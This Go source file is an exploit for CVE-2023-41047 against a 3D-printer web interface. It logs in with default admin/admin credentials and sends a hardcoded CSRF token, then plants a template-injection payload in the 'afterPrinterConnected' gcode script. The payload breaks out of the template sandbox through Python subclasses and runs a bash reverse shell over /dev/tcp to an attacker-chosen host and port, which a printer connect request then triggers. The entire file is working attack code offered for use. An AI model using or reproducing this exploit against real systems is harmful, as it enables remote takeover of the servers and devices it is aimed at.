package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
)

var (
	PROXYURL = ""
)

const CSRFTOKEN = "ImU4ZmY1NDhlZTU1ZGI5M2I2MjA3YmZhYjAxY2QzOWQxOTRiN2Q0YTgi.ZUn0tg.OEMZhA3pw-YZTkm7INGV0FBBjZg"

func getLoginCookie(uri string) string {
	uri += "/api/login"
	proxy, _ := url.Parse(PROXYURL)
	tr := &http.Transport{
		Proxy:           http.ProxyURL(proxy),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
	}

	data := `{"user":"admin","pass":"admin","remember":false}`

	req, err := http.NewRequest("POST", uri, strings.NewReader(data))

	if err != nil {
		log.Println("Error creating request:", err)
	}

	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
	//req.Header.Set("X-CSRF-Token", CSRFTOKEN)
	//req.Header.Set("Cookie", "csrf_token_P5000="+CSRFTOKEN)

	resp, err := client.Do(req)

	if err != nil {
		log.Println("Error making request:", err)
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("HTTP request failed with status code: %d\n", resp.StatusCode)
	}

	cookies := resp.Cookies()
	if len(cookies) == 0 {
		log.Println("No cookies found in the response.")
	}

	cookieStr := ""

	for _, cookie := range cookies {
		if cookie.Name == "session_P5000" {
			cookieStr = "csrf_token_P5000= " + CSRFTOKEN + ";" + cookie.Name + "=" + cookie.Value
		}
		//log.Printf("Name: %s, Value: %s\n", cookie.Name, cookie.Value)
	}

	return cookieStr
}

func setRequest(uri string, cookie string, payload string, types int, wg *sync.WaitGroup) {
	defer wg.Done()
	if types == 0 {
		uri += "/api/settings"
	} else if types == 1 {
		uri += "/api/connection"
	}

	proxy, _ := url.Parse(PROXYURL)
	tr := &http.Transport{
		Proxy:           http.ProxyURL(proxy),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
	}

	req, err := http.NewRequest("POST", uri, strings.NewReader(payload))

	if err != nil {
		log.Println("Error creating request:", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-CSRF-Token", CSRFTOKEN)
	req.Header.Set("Cookie", cookie)

	_, err = client.Do(req)

	if err != nil {
		log.Println("Error making request:", err)
	}

	//defer resp.Body.Close()

	//log.Println(resp.StatusCode)
}

func main() {

	if len(os.Args) <= 4 {
		fmt.Println("Usage: ./CVE-2023-41047 <target> <proxyUrl> <reverse IP> <reverse PORT>")
		return
	}

	uri := os.Args[1]
	PROXYURL = os.Args[2]
	reverseIP := os.Args[3]
	reversePort := os.Args[4]

	cookie := getLoginCookie(uri)

	var wg sync.WaitGroup
	wg.Add(1)

	log.Println("[*] Start...")
	// Turn on virtual printer
	payload := `{"plugins":{"virtual_printer":{"enabled":true}},"temperature":{"profiles":[{"name":"ABS","extruder":210,"bed":100,"chamber":null},{"name":"PLA","extruder":180,"bed":60,"chamber":null}]}}`
	go setRequest(uri, cookie, payload, 0, &wg)
	log.Println("[+] Step 1 finish...")
	// Set evil gcode
	payload = `{"scripts":{"gcode":{"afterPrinterConnected":"{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__=='catch_warnings' %} {{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('bash -c \\\"bash -i  >&/dev/tcp/` + reverseIP + `/` + reversePort + ` 0>&1\\\"').read()\") }} {% endif %} {% endfor %}"}},"temperature":{"profiles":[{"name":"ABS","extruder":210,"bed":100,"chamber":null},{"name":"PLA","extruder":180,"bed":60,"chamber":null}]}}`
	go setRequest(uri, cookie, payload, 0, &wg)
	log.Println("[+] Step 2 finish...")

	payload = `{"port":"AUTO","baudrate":0,"printerProfile":"_default","autoconnect":false,"command":"connect"}`
	go setRequest(uri, cookie, payload, 1, &wg)
	log.Printf("[+] Step 3 reverse: tcp://%s:%s", reverseIP, reversePort)
	payload = `{"command":"disconnect"}`
	go setRequest(uri, cookie, payload, 1, &wg)

	wg.Wait()
}
